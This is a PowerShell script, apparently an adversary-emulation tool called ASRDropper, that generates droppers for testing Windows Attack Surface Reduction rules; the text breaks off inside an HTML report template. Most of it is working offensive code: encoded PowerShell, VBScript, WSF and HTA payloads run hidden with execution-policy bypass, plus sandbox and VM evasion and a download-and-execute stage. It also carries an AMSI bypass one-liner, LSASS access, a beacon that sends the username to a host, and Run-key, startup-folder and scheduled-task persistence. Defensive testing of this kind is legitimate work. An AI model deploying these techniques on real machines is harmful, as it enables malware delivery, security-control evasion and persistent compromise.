# ─────────────────────────────────────────────────────
#  Enhanced logging function
# ─────────────────────────────────────────────────────
# Define DropPath explicitly before using any functions
$DropPath = "C:\Users\Public"

function Write-Log {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message,
        
        [Parameter(Mandatory=$false)]
        [ValidateSet('INFO', 'WARNING', 'ERROR', 'SUCCESS', 'DEBUG')]
        [string]$Level = 'INFO',
        
        [Parameter(Mandatory=$false)]
        [string]$LogPath = "$DropPath\ASRDropper_log.txt",
        
        [Parameter(Mandatory=$false)]
        [switch]$NoConsole
    )
    
    # Create timestamp
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    # Format log entry
    $logEntry = "[$timestamp] [$Level] $Message"
    
    # Determine console color based on level
    $consoleColor = switch ($Level) {
        'INFO'    { 'White' }
        'WARNING' { 'Yellow' }
        'ERROR'   { 'Red' }
        'SUCCESS' { 'Green' }
        'DEBUG'   { 'Cyan' }
        default   { 'White' }
    }
    
    # Write to log file (create directory if it doesn't exist)
    $logDir = Split-Path -Path $LogPath -Parent
    if (-not (Test-Path -Path $logDir)) {
        New-Item -ItemType Directory -Force -Path $logDir | Out-Null
    }
    
    # Append to log file
    Add-Content -Path $LogPath -Value $logEntry -Force
    
    # Write to console if not suppressed
    if (-not $NoConsole) {
        Write-Host $logEntry -ForegroundColor $consoleColor
    }
}

# ─────────────────────────────────────────────────────
#  PowerShell payload generation function
# ─────────────────────────────────────────────────────
function New-PowerShellPayload {
    param(
        [string]$OutputPath,
        [string]$PayloadToExecute,
        [switch]$WithEvasion,
        [switch]$WithDownloader
    )
    
    Write-Log "Generating PowerShell payload..." -Level INFO
    
    # Start with basic template
    $payloadContent = "@echo off`nsetlocal`npowershell.exe -NoProfile -ExecutionPolicy Bypass -Command `"&{`n"
    
    # Add evasion techniques if requested
    if ($WithEvasion) {
        Write-Log "Adding evasion techniques to PowerShell payload" -Level DEBUG
        $payloadContent += @"
# Check for sandbox/analysis environment
`$isVM = (Get-WmiObject -Class Win32_ComputerSystem).Model -match 'Virtual|VMware|VirtualBox|HVM'
`$isAnalysis = (Get-Process -Name wireshark, processexplorer, processhacker -ErrorAction SilentlyContinue).Count -gt 0
if (`$isVM -or `$isAnalysis) {
    Write-Output 'Environment check failed, exiting...'
    exit
}
Start-Sleep -Seconds 3

"@
    }
    
    # Add downloader component if requested
    if ($WithDownloader) {
        Write-Log "Adding download capability to PowerShell payload" -Level DEBUG
        $payloadContent += @"
# Download component
try {
    Invoke-WebRequest -Uri 'http://127.0.0.1:8080/stage2.ps1' -OutFile '`$env:TEMP\stage2.ps1' -ErrorAction Stop
    if (Test-Path '`$env:TEMP\stage2.ps1') {
        . '`$env:TEMP\stage2.ps1'
    }
} catch {
    Write-Output 'Download failed, continuing with embedded payload...'
}

"@
    }
    
    # Add the actual payload
    $payloadContent += "$PayloadToExecute`n`"}`""
    
    # Save to file
    Set-Content -Path $OutputPath -Value $payloadContent -Force
    Write-Log "PowerShell payload saved to: $OutputPath" -Level SUCCESS
    
    return $OutputPath
}

# ─────────────────────────────────────────────────────
#  VBScript payload generation function
# ─────────────────────────────────────────────────────
function New-VBScriptPayload {
    param(
        [string]$OutputPath,
        [string]$PayloadToExecute,
        [switch]$WithEvasion,
        [switch]$LaunchPowerShell
    )
    
    Write-Log "Generating VBScript payload..." -Level INFO
    
    # Prepare PowerShell command to be executed
    $poshCommand = $PayloadToExecute
    if ($LaunchPowerShell) {
        # Encode the PowerShell command
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($PayloadToExecute)
        $encodedCommand = [Convert]::ToBase64String($bytes)
        $poshCommand = "-EncodedCommand $encodedCommand"
    }
    
    # Start with basic template
    $payloadContent = "Option Explicit`r`n"
    
    # Add evasion techniques if requested
    if ($WithEvasion) {
        Write-Log "Adding evasion techniques to VBScript payload" -Level DEBUG
        $payloadContent += @"
' Sandbox evasion techniques
Function IsVirtualMachine()
    Dim objWMI, colItems
    On Error Resume Next
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMI.ExecQuery("Select * from Win32_ComputerSystem")
    For Each objItem in colItems
        If InStr(LCase(objItem.Model), "virtual") > 0 Then
            IsVirtualMachine = True
            Exit Function
        End If
    Next
    IsVirtualMachine = False
End Function

' Sleep to evade sandbox
WScript.Sleep 5000

' Check for VM
If IsVirtualMachine() Then
    WScript.Echo "Environment check failed, exiting..."
    WScript.Quit
End If

"@
    }
    
    # Add the execution component
    if ($LaunchPowerShell) {
        $payloadContent += @"
' Execute PowerShell command
Dim objShell, powershellCmd
Set objShell = CreateObject("WScript.Shell")
powershellCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass $poshCommand"
objShell.Run powershellCmd, 0, False
"@
    } else {
        $payloadContent += @"
' Execute direct VBScript code
Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c $poshCommand", 0, False
"@
    }
    
    # Save to file
    Set-Content -Path $OutputPath -Value $payloadContent -Force
    Write-Log "VBScript payload saved to: $OutputPath" -Level SUCCESS
    
    return $OutputPath
}

# ─────────────────────────────────────────────────────
#  WSF (Windows Script File) payload generation function
# ─────────────────────────────────────────────────────
function New-WSFPayload {
    param(
        [string]$OutputPath,
        [string]$PayloadToExecute,
        [switch]$WithEvasion
    )
    
    Write-Log "Generating WSF payload..." -Level INFO
    
    # Start with basic template
    $payloadContent = @"
<?xml version="1.0" ?>
<package>
    <job id="VBSSection">
        <script language="VBScript">
            Option Explicit
            
"@
    
    # Add evasion techniques if requested
    if ($WithEvasion) {
        Write-Log "Adding evasion techniques to WSF payload" -Level DEBUG
        $payloadContent += @"
            ' Sandbox evasion techniques
            Function IsVirtualMachine()
                Dim objWMI, colItems
                On Error Resume Next
                Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
                Set colItems = objWMI.ExecQuery("Select * from Win32_ComputerSystem")
                For Each objItem in colItems
                    If InStr(LCase(objItem.Model), "virtual") > 0 Then
                        IsVirtualMachine = True
                        Exit Function
                    End If
                Next
                IsVirtualMachine = False
            End Function
            
            ' Sleep to evade sandbox
            WScript.Sleep 5000
            
            ' Check for VM
            If IsVirtualMachine() Then
                WScript.Echo "Environment check failed, exiting..."
                WScript.Quit
            End If
            
"@
    }
    
    # Add VBScript execution section
    $payloadContent += @"
            ' VBScript section
            Dim objShell
            Set objShell = CreateObject("WScript.Shell")
            objShell.Run "cmd.exe /c echo VBScript section executed", 0, True
        </script>
    </job>
    
    <job id="JSSection">
        <script language="JScript">
            // JScript section
"@
    
    if ($WithEvasion) {
        $payloadContent += @"
            
            // Sleep for evasion
            function sleep(milliseconds) {
                var start = new Date().getTime();
                for (var i = 0; i < 1e7; i++) {
                    if ((new Date().getTime() - start) > milliseconds) {
                        break;
                    }
                }
            }
            
            sleep(3000);
            
"@
    }
    
    # Add the actual PowerShell execution 
    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($PayloadToExecute))
    
    $payloadContent += @"
            
            // Execute PowerShell command
            var shell = new ActiveXObject("WScript.Shell");
            var cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand";
            shell.Run(cmd, 0, false);
        </script>
    </job>
</package>
"@
    
    # Save to file
    Set-Content -Path $OutputPath -Value $payloadContent -Force
    Write-Log "WSF payload saved to: $OutputPath" -Level SUCCESS
    
    return $OutputPath
}

# ─────────────────────────────────────────────────────
#  Update Global variables section
# ─────────────────────────────────────────────────────
$Execute         = $false
$LogHtml         = $true
$Persist         = $false
$CreateShortcut  = $false
$Cleanup         = $false
$Signatures      = $false
$Evasion         = $false
$ExternalProcess = "calc.exe"
$PayloadCode     = "Write-Output '[Stage 2] Payload Executed!'"
$TestASR         = $false
$SelectedASRRules= @()
$VerboseLogging  = $true       # New: Enable detailed logging
$LogFile         = "ASRDropper_detailed.log" # New: Default log file

# ─────────────────────────────────────────────────────
#  Update Show-Menu function to include new options
# ─────────────────────────────────────────────────────
function Show-Menu {
    Clear-Host
    $border = '*' * 60
    Write-Host $border -ForegroundColor DarkCyan
    Write-Host $banner
    Write-Host $border -ForegroundColor DarkCyan

    $titleText   = 'ASRDROPPER'
    $versionText = 'v1.1 - Enhanced Testing Suite'  # Updated version
    $contentWidth = $border.Length - 2
    $titleLine   = '*' + $titleText.PadLeft(([math]::Floor(($contentWidth + $titleText.Length)/2))).PadRight($contentWidth) + '*'
    $versionLine = '*' + $versionText.PadLeft(([math]::Floor(($contentWidth + $versionText.Length)/2))).PadRight($contentWidth) + '*'
    Write-Host $titleLine -ForegroundColor Yellow
    Write-Host $versionLine -ForegroundColor Yellow
    Write-Host $border -ForegroundColor DarkCyan
    Write-Host

    Write-Host "=== ASR Multi-Vector Dropper ===" -ForegroundColor Cyan
    Write-Host "Configure your test suite:"
    Write-Host "[1] Toggle: Execute Payloads ($Execute)"
    Write-Host "[2] Toggle: Generate HTML Report ($LogHtml)"
    Write-Host "[3] Toggle: Enable Persistence ($Persist)"
    Write-Host "[4] Toggle: Create .lnk Shortcut ($CreateShortcut)"
    Write-Host "[5] Toggle: Cleanup After Execution ($Cleanup)"
    Write-Host "[6] Toggle: Include Signature Strings ($Signatures)"
    Write-Host "[7] Toggle: Sandbox Evasion (sleep, env checks) ($Evasion)"
    Write-Host "[8] Select Stage-2 Payload Source"
    Write-Host "[9] Choose Process for HTA/COM Launch ($ExternalProcess)"
    Write-Host "[A] Configure ASR Rules Testing" -ForegroundColor Yellow
    Write-Host "[C] Toggle: Upload Logs to Azure Blob ($UploadLogs)"
    Write-Host "[L] Configure Detailed Logging Options" -ForegroundColor Green  # New option
    Write-Host "[P] Configure Additional Payload Types" -ForegroundColor Green  # New option
    Write-Host "[Y] Generate YARA Signature Baits"
    Write-Host "[Z] Generate All Payload Variants"
    Write-Host "[0] Run Dropper with Selected Options"
    Write-Host
}

# ─────────────────────────────────────────────────────
#  Add new logging configuration menu
# ─────────────────────────────────────────────────────
function Configure-Logging {
    Clear-Host
    Write-Host "=== Detailed Logging Configuration ===" -ForegroundColor Green
    Write-Host "Configure how detailed logs are generated:"
    Write-Host "[1] Toggle: Verbose Logging ($VerboseLogging)"
    Write-Host "[2] Change Log File Path (Current: $LogFile)"
    Write-Host "[3] Toggle: Log to Event Log"
    Write-Host "[4] Set Log Retention (Days)"
    Write-Host "[5] Create Log Directory Structure"
    Write-Host "[B] Back to Main Menu"
    
    $choice = Read-Host "Enter your choice"
    switch ($choice) {
        '1' { $script:VerboseLogging = -not $VerboseLogging }
        '2' {
            $newPath = Read-Host "Enter new log file path (full path or filename)"
            if ($newPath -match '[\\/]') {
                # Full path specified
                $script:LogFile = $newPath
            } else {
                # Just filename
                $script:LogFile = $newPath
            }
        }
        '3' {
            Write-Host "Event log functionality not implemented yet" -ForegroundColor Yellow
            Start-Sleep -Seconds 2
        }
        '4' {
            $days = Read-Host "Enter log retention period in days"
            if ([int]::TryParse($days, [ref]$null)) {
                Write-Host "Log retention set to $days days" -ForegroundColor Green
                # Implementation would be here
            } else {
                Write-Host "Invalid input. Please enter a number." -ForegroundColor Red
            }
            Start-Sleep -Seconds 2
        }
        '5' {
            $logDir = Join-Path $DropPath "Logs"
            if (-not (Test-Path $logDir)) {
                New-Item -ItemType Directory -Path $logDir -Force | Out-Null
                Write-Host "Created log directory: $logDir" -ForegroundColor Green
            } else {
                Write-Host "Log directory already exists: $logDir" -ForegroundColor Yellow
            }
            
            # Create subdirectories
            $dirs = @("ASR", "Payloads", "Persistence", "Reports")
            foreach ($dir in $dirs) {
                $path = Join-Path $logDir $dir
                if (-not (Test-Path $path)) {
                    New-Item -ItemType Directory -Path $path -Force | Out-Null
                    Write-Host "Created directory: $path" -ForegroundColor Green
                }
            }
            
            $script:LogFile = Join-Path $logDir "ASRDropper_detailed.log"
            Write-Host "Log file set to: $LogFile" -ForegroundColor Green
            Start-Sleep -Seconds 3
        }
        'B' { return }
        'b' { return }
        default {
            Write-Host "Invalid choice. Please try again." -ForegroundColor Red
            Start-Sleep -Seconds 2
        }
    }
    
    Configure-Logging
}

# ─────────────────────────────────────────────────────
#  Add additional payload types configuration menu
# ─────────────────────────────────────────────────────
$UsePS1Payload = $true
$UseVBSPayload = $false
$UseWSFPayload = $false
$UseAllPayloads = $false

function Configure-PayloadTypes {
    Clear-Host
    Write-Host "=== Additional Payload Types Configuration ===" -ForegroundColor Green
    Write-Host "Select which payload types to generate:"
    Write-Host "[1] Toggle: PowerShell Script (.ps1) ($UsePS1Payload)"
    Write-Host "[2] Toggle: VBScript (.vbs) ($UseVBSPayload)"
    Write-Host "[3] Toggle: Windows Script File (.wsf) ($UseWSFPayload)"
    Write-Host "[4] Toggle: Generate All Payload Types ($UseAllPayloads)"
    Write-Host "[5] Configure Payload-specific Options"
    Write-Host "[B] Back to Main Menu"
    
    $choice = Read-Host "Enter your choice"
    switch ($choice) {
        '1' { $script:UsePS1Payload = -not $UsePS1Payload }
        '2' { $script:UseVBSPayload = -not $UseVBSPayload }
        '3' { $script:UseWSFPayload = -not $UseWSFPayload }
        '4' { 
            $script:UseAllPayloads = -not $UseAllPayloads
            if ($UseAllPayloads) {
                $script:UsePS1Payload = $true
                $script:UseVBSPayload = $true
                $script:UseWSFPayload = $true
            }
        }
        '5' {
            Configure-PayloadOptions
        }
        'B' { return }
        'b' { return }
        default {
            Write-Host "Invalid choice. Please try again." -ForegroundColor Red
            Start-Sleep -Seconds 2
        }
    }
    
    Configure-PayloadTypes
}

# Payload-specific options
$PSPayloadOptions = @{
    UseDownloader = $false
    UseReflection = $false
    UseAmsiBypass = $false
}

$VBSPayloadOptions = @{
    LaunchPowerShell = $true
    UseActiveXObjects = $true
    UseRegsvr32 = $false
}

function Configure-PayloadOptions {
    Clear-Host
    Write-Host "=== Payload-specific Options ===" -ForegroundColor Green
    Write-Host "Configure options for specific payload types:"
    Write-Host "`nPowerShell Options:" -ForegroundColor Cyan
    Write-Host "[1] Toggle: Include Downloader Component ($($PSPayloadOptions.UseDownloader))"
    Write-Host "[2] Toggle: Use Reflection Techniques ($($PSPayloadOptions.UseReflection))"
    Write-Host "[3] Toggle: Include AMSI Bypass ($($PSPayloadOptions.UseAmsiBypass))"
    
    Write-Host "`nVBScript Options:" -ForegroundColor Cyan
    Write-Host "[4] Toggle: Launch PowerShell from VBS ($($VBSPayloadOptions.LaunchPowerShell))"
    Write-Host "[5] Toggle: Use ActiveX Objects ($($VBSPayloadOptions.UseActiveXObjects))"
    Write-Host "[6] Toggle: Use regsvr32 Technique ($($VBSPayloadOptions.UseRegsvr32))"
    
    Write-Host "`n[B] Back to Payload Types Menu"
    
    $choice = Read-Host "Enter your choice"
    switch ($choice) {
        '1' { $script:PSPayloadOptions.UseDownloader = -not $PSPayloadOptions.UseDownloader }
        '2' { $script:PSPayloadOptions.UseReflection = -not $PSPayloadOptions.UseReflection }
        '3' { $script:PSPayloadOptions.UseAmsiBypass = -not $PSPayloadOptions.UseAmsiBypass }
        '4' { $script:VBSPayloadOptions.LaunchPowerShell = -not $VBSPayloadOptions.LaunchPowerShell }
        '5' { $script:VBSPayloadOptions.UseActiveXObjects = -not $VBSPayloadOptions.UseActiveXObjects }
        '6' { $script:VBSPayloadOptions.UseRegsvr32 = -not $VBSPayloadOptions.UseRegsvr32 }
        'B' { return }
        'b' { return }
        default {
            Write-Host "Invalid choice. Please try again." -ForegroundColor Red
            Start-Sleep -Seconds 2
        }
    }
    
    Configure-PayloadOptions
}

# ─────────────────────────────────────────────────────
#  Update Select-Payload function with logging
# ─────────────────────────────────────────────────────
function Select-Payload {
    Write-Host "`n=== Payload Source Selection ===" -ForegroundColor Cyan
    Write-Host "[1] Use default payload"
    Write-Host "[2] Paste inline payload"
    Write-Host "[3] Load from .ps1 file"
    Write-Host "[4] Use template"
    $choice = Read-Host "Choose option"

    switch ($choice) {
        '1' { 
            Write-Log "Selected default payload" -Level INFO
            return 'Write-Output "[Stage 2] Payload Executed!"' 
        }
        '2' {
            Write-Host "Paste your payload code (end with a blank line):"
            $lines = @()
            while ($true) {
                $line = Read-Host ">>"
                if ($line -eq '') { break }
                $lines += $line
            }
            Write-Log "Selected custom inline payload" -Level INFO
            return $lines -join "`n"
        }
        '3' {
            $file = Read-Host "Enter full path to .ps1 file"
            if (Test-Path $file) {
                Write-Log "Loading payload from file: $file" -Level INFO
                return Get-Content -Raw -Path $file
            } else {
                Write-Log "File not found: $file" -Level ERROR
                Write-Host "File not found." -ForegroundColor Red
                return Select-Payload
            }
        }
        '4' {
            Write-Host "[a] AMSI Bypass"
            Write-Host "[b] Simulated LSASS Access"
            Write-Host "[c] Web Callback Beacon"
            Write-Host "[d] Registry Persistence" # New template
            Write-Host "[e] Scheduled Task Creation" # New template
            $tpl = Read-Host "Choose template"
            switch ($tpl) {
                'a' { 
                    Write-Log "Selected AMSI Bypass template" -Level INFO
                    return '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)' 
                }
                'b' { 
                    Write-Log "Selected LSASS Access template" -Level INFO
                    return 'Get-Process -Name lsass | ForEach-Object { Write-Output "Accessing PID $($_.Id)" }' 
                }
                'c' { 
                    Write-Log "Selected Web Callback template" -Level INFO
                    return 'Invoke-WebRequest -Uri "http://example.com/beacon?id=$env:USERNAME" -UseBasicParsing' 
                }
                'd' {
                    Write-Log "Selected Registry Persistence template" -Level INFO
                    return 'New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TestPersistence" -Value "powershell.exe -WindowStyle Hidden -Command \"Write-Output ''Registry persistence test''\""'
                }
                'e' {
                    Write-Log "Selected Scheduled Task template" -Level INFO
                    return '$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command \"Write-Output ''Scheduled task test''\""
$trigger = New-ScheduledTaskTrigger -Daily -At "12:00"
$settings = New-ScheduledTaskSettingsSet -Hidden
$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings
Register-ScheduledTask -TaskName "ASRTest" -InputObject $task -Force'
                }
                default {
                    Write-Log "Invalid template selection" -Level WARNING
                    Write-Host "Invalid template." -ForegroundColor Red
                    return Select-Payload
                }
            }
        }
        default {
            Write-Log "Invalid payload selection option" -Level WARNING
            Write-Host "Invalid option. Try again." -ForegroundColor Red
            return Select-Payload
        }
    }
}

# ─────────────────────────────────────────────────────
#  Update menu loop to include new options
# ─────────────────────────────────────────────────────
# === Menu Loop ===
do {
    Show-Menu
    $choice = Read-Host "Choose an option"
    switch ($choice) {
        '1' { $Execute = -not $Execute }
        '2' { $LogHtml = -not $LogHtml }
        '3' { $Persist = -not $Persist }
        '4' { $CreateShortcut = -not $CreateShortcut }
        '5' { $Cleanup = -not $Cleanup }
        '6' { $Signatures = -not $Signatures }
        '7' { $Evasion = -not $Evasion }
        '8' { $PayloadCode = Select-Payload }
        '9' { $ExternalProcess = Read-Host "Enter process to launch (e.g., calc.exe or notepad.exe)" }
        'A' { Show-ASRRulesMenu }
        'a' { Show-ASRRulesMenu }
        'L' { Configure-Logging }
        'l' { Configure-Logging }
        'P' { Configure-PayloadTypes }
        'p' { Configure-PayloadTypes }
        # Other options remain the same
    }
} while ($choice -ne '0')

# ─────────────────────────────────────────────────────
#  Update main execution section
# ─────────────────────────────────────────────────────
# Initialize logging
Write-Log "ASRDropper script started" -Level INFO -LogPath (Join-Path $DropPath $LogFile)
Write-Log "Using output directory: $DropPath" -Level INFO

# === Setup
$DropPath = "C:\Users\Public"
Write-Log "Using output directory: $DropPath" -Level INFO

$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$results = @()
function New-RandomName { ( -join ((48..57)+(97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_}) ) }

function Encode($s) { 
    Write-Log "Encoding payload content" -Level DEBUG -NoConsole
    return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s)) 
}

# === File Names
$fn_test = (New-RandomName) + ".ps1"
$fn_ps   = (New-RandomName) + ".ps1"
$fn_com  = (New-RandomName) + ".ps1"
$fn_multi = (New-RandomName) + ".ps1"
$fn_hta  = (New-RandomName) + ".hta"
$fn_sig  = (New-RandomName) + ".ps1"
$fn_vbs  = (New-RandomName) + ".vbs"  # New: VBScript file
$fn_wsf  = (New-RandomName) + ".wsf"  # New: WSF file
$fn_ps1_custom = (New-RandomName) + ".ps1"  # New: Custom PowerShell file

$testScript = Join-Path $DropPath $fn_test
Write-Log "Generated random filenames:" -Level INFO
Write-Log "Test script: $fn_test" -Level DEBUG
Write-Log "PS1: $fn_ps, VBS: $fn_vbs, WSF: $fn_wsf" -Level DEBUG

# === Stage 2 Payload
if ($Evasion) {
    Write-Log "Adding evasion techniques to payload" -Level INFO
    $PayloadCode = "Start-Sleep -Seconds 5`nif (([Environment]::UserName -eq 'WDAGUtilityAccount') -or ($env:COMPUTERNAME -like '*SANDBOX*')) { exit }`n$PayloadCode"
}
Write-Log "Creating stage 2 payload script: $testScript" -Level INFO
Set-Content $testScript $PayloadCode -Force

# === Payload Creation (existing + new types)
# Create a structure to track all payloads
$allPayloads = @()

# === Payload 1: Encoded
Write-Log "Creating encoded PowerShell payload" -Level INFO
$encoded1 = Encode "IEX `"$testScript`""
$p1 = Join-Path $DropPath $fn_ps
Set-Content $p1 "`$b='$encoded1';iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$b)))" -Force
$allPayloads += @{
    Type = "PowerShell"
    Name = "Encoded PS"
    Path = $p1
    IsHTA = $false
}

# === Payload 2: COM (external process)
Write-Log "Creating COM payload to launch: $ExternalProcess" -Level INFO
$p2 = Join-Path $DropPath $fn_com
Set-Content $p2 "(New-Object -ComObject WScript.Shell).Run('powershell -ep bypass -w hidden -Command `"Start-Process $ExternalProcess`"')" -Force
$allPayloads += @{
    Type = "PowerShell"
    Name = "COM Shell"
    Path = $p2
    IsHTA = $false
}

# === Payload 3: Multi

Write-Log "Creating multi-stage payload" -Level INFO
$chunks = ($encoded1.ToCharArray() | ForEach-Object { "'$_'" }) -join ","
$p3 = Join-Path $DropPath $fn_multi
Set-Content $p3 "`$s = [string]::Join('', @($chunks));iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$s)))" -Force
$allPayloads += @{
    Type = "PowerShell"
    Name = "Multi-stage"
    Path = $p3
    IsHTA = $false
}

# === Payload 4: HTA
Write-Log "Creating HTA payload" -Level INFO
$p4 = Join-Path $DropPath $fn_hta
$html = "<html><head><script>new ActiveXObject('WScript.Shell').Run('powershell -ep bypass -w hidden -Command `"Start-Process $ExternalProcess`"');window.close();</script></head><body></body></html>"
Set-Content $p4 $html
$allPayloads += @{
    Type = "HTA"
    Name = "HTA"
    Path = $p4
    IsHTA = $true
}

# === Payload 5: Signatures
$p5 = Join-Path $DropPath $fn_sig
if ($Signatures) {
    Write-Log "Creating payload with signature strings" -Level INFO
    # Set URL for Invoke-Mimikatz
    $mimikatzUrl = "https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1"

    $payload = @"
`$x = 'Invoke-Mimikatz from $mimikatzUrl sekurlsa::logonpasswords SharpHound CobaltStrike'
Write-Host '[YARA bait triggered]'
"@
    Set-Content -Path $p5 -Value $payload
    Write-Log "Injected YARA bait payload to $p5" -Level INFO
    
    $allPayloads += @{
        Type = "PowerShell"
        Name = "Signature Bait"
        Path = $p5
        IsHTA = $false
    }
}

# === NEW Payload 6: VBScript
if ($UseVBSPayload -or $UseAllPayloads) {
    Write-Log "Creating VBScript payload" -Level INFO
    $p6 = Join-Path $DropPath $fn_vbs
    
    $vbs_params = @{
        OutputPath = $p6
        PayloadToExecute = $PayloadCode
        WithEvasion = $Evasion
        LaunchPowerShell = $VBSPayloadOptions.LaunchPowerShell
    }
    
    $p6 = New-VBScriptPayload @vbs_params
    
    $allPayloads += @{
        Type = "VBScript"
        Name = "VBS Script"
        Path = $p6
        IsHTA = $false
    }
}

# === NEW Payload 7: WSF (Windows Script File)
if ($UseWSFPayload -or $UseAllPayloads) {
    Write-Log "Creating WSF payload" -Level INFO
    $p7 = Join-Path $DropPath $fn_wsf
    
    $wsf_params = @{
        OutputPath = $p7
        PayloadToExecute = $PayloadCode
        WithEvasion = $Evasion
    }
    
    $p7 = New-WSFPayload @wsf_params
    
    $allPayloads += @{
        Type = "WSF"
        Name = "Windows Script File"
        Path = $p7
        IsHTA = $false
    }
}

# === NEW Payload 8: Custom PowerShell
if ($UsePS1Payload -or $UseAllPayloads) {
    Write-Log "Creating custom PowerShell payload" -Level INFO
    $p8 = Join-Path $DropPath $fn_ps1_custom
    
    $ps1_params = @{
        OutputPath = $p8
        PayloadToExecute = $PayloadCode
        WithEvasion = $Evasion
        WithDownloader = $PSPayloadOptions.UseDownloader
    }
    
    $p8 = New-PowerShellPayload @ps1_params
    
    $allPayloads += @{
        Type = "PowerShell"
        Name = "Advanced PS1"
        Path = $p8
        IsHTA = $false
    }
}

# === Shortcut
if ($CreateShortcut) {
    Write-Log "Creating shortcut to PowerShell payload" -Level INFO
    $sc = "$DropPath\loader.lnk"
    $ws = New-Object -ComObject WScript.Shell
    $lnk = $ws.CreateShortcut($sc)
    $lnk.TargetPath = "powershell.exe"
    $lnk.Arguments = "-ep bypass -w hidden -File `"$p1`""
    $lnk.Save()
}

# === Persistence
if ($Persist) {
    Write-Log "Setting up persistence mechanisms" -Level INFO
    $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$fn_ps"
    Copy-Item $p1 $startup -Force
    Write-Log "Copied payload to startup folder: $startup" -Level INFO
    
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ASRDropper" `
        -Value "powershell -ep bypass -w hidden -File `"$startup`"" -Force
    Write-Log "Added registry run key for persistence" -Level INFO
    
    # Add more detailed logging for registry persistence
    try {
        $regValue = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ASRDropper" -ErrorAction SilentlyContinue
        if ($regValue) {
            Write-Log "Verified registry persistence key: $($regValue.ASRDropper)" -Level SUCCESS
        }
    } catch {
        Write-Log "Failed to verify registry persistence: $($_.Exception.Message)" -Level ERROR
    }
}

# === Execution + Logging
Write-Log "Preparing to execute payloads (Execute = $Execute)" -Level INFO

foreach ($p in $allPayloads) {
    $cmdParams = @{}
    
    $cmd = if ($p.IsHTA) { 
        "mshta `"$($p.Path)`"" 
    } elseif ($p.Type -eq "VBScript") {
        "cscript //nologo `"$($p.Path)`""
    } elseif ($p.Type -eq "WSF") {
        "cscript //nologo `"$($p.Path)`""
    } else { 
        "powershell -ep bypass -w hidden -File `"$($p.Path)`"" 
    }
    
    Write-Log "Processing payload: $($p.Name) ($($p.Type))" -Level INFO
    Write-Log "Command: $cmd" -Level DEBUG -NoConsole
    
    $out = ''
    if ($Execute) {
        Write-Log "Executing payload: $($p.Name)" -Level INFO
        try { 
            $out = & powershell -Command $cmd *>&1
            Write-Log "Execution output: $out" -Level DEBUG
        }
        catch { 
            $out = $_.Exception.Message 
            Write-Log "Execution error: $out" -Level ERROR
        }
    } else {
        Write-Log "Execution skipped (not enabled)" -Level INFO
    }
    
    $success = $out -match "Executed|YARA|Accessing PID"
    $results += [pscustomobject]@{
        Type = $p.Type
        Name = $p.Name
        Path = $p.Path
        Output = $out -join "`n"
        Success = $success
    }
    
    Write-Log "Result: $($p.Name) - $(if($success){'Success'}else{'Failed'})" -Level $(if($success){'SUCCESS'}else{'WARNING'})
}

# === Test ASR Rules
$asrResults = @()
if ($TestASR) {
    Write-Log "Starting ASR rules testing" -Level INFO
    $asrResults = Test-ASRRules
}

# === HTML Log
if ($LogHtml) {
    # Ask for custom HTML report filename
    $defaultReportName = "ASR-Report-$(Get-Date -Format 'yyyyMMdd-HHmmss').html"
    $customReportName = Read-Host "Enter custom HTML report filename (default: $defaultReportName)"
    
    if ([string]::IsNullOrWhiteSpace($customReportName)) {
        $reportFilename = $defaultReportName
    } else {
        # Ensure filename has .html extension
        if (-not $customReportName.EndsWith(".html", [StringComparison]::OrdinalIgnoreCase)) {
            $reportFilename = "$customReportName.html"
        } else {
            $reportFilename = $customReportName
        }
    }
    
    $logPath = Join-Path $DropPath $reportFilename
    Write-Log "Creating HTML report: $logPath" -Level INFO
    
    # Create HTML report (extended with new payload types)
    # PS 5.1 compatible HTML without Unicode characters
    $html = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ASR Dropper and Rules Testing Report</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f8f9fa;
        }
        h1, h2, h3 {
            color: #2c3e50;
        }
        h1 {
            border-bottom: 2px solid #3498db;
            padding-bottom: 10px;
            margin-bottom: 30px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header-right {
            text-align: right;
        }
        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 20px;
            margin: 20px 0;
        }
        .summary {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .summary-box {
            background: #f5f5f5;
            border-radius: 5px;
            padding: 15px;
            width: 30%;
            box-shadow: 0 1px 5px rgba(0,0,0,0.05);
            margin-bottom: 10px;
        }
        .success {
            color: #27ae60;
            font-weight: bold;
        }
        .warning {
            color: #f39c12;
            font-weight: bold;
        }
        .danger {
            color: #e74c3c;
            font-weight: bold;
        }
        .info {
            color: #3498db;
            font-weight: bold;
        }
